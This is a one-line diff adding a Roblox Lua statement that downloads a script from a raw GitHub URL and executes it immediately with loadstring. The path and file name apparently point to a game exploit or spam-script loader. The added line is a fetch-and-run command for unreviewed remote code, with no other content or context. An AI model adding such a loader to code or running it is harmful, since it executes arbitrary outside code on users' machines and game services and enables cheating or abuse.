@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/bewitched-spam4-snr6nkz5hwxnh1.lua"))()
